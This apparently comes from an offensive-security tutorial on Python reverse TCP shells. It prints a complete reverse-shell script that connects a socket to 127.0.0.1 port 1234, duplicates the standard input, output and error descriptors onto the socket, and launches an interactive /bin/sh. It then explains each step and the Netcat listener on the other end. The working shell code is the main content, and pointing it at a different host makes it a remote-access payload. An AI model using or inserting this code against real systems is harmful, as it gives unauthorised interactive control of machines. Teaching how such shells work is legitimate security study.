
# Reverse TCP shells with Python

```python
#! /usr/bin/python3.5
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


```
It should be noted that OS.dup2 is used to create a duplicate of a file descriptor in Python. The stdin is defined to be file descriptor 0, stdout is defined to be file descriptor 1, and stderr is defined to be file descriptor 2. The code line OS.dup2(s.fileno(),0) indicates that we should create a duplicate of stdin and redirect the traffic to the socket file, which happens to be on the localhost and port 1234 (where Netcat is listening). Finally, we invoke the shell in interactive mode and since we are not specifying the stderr, stdin and stdout parameters, by default, the parameters will be sent to stdin and stdout at system level, which is again mapped to the socket for the scope of the program. For this reason, the preceding code snippet will open the shell in interactive mode and pass it on to the socket. All input is taken from the socket as stdin, and all output is passed to the socket via stdout. This can be validated by looking at the output produced.
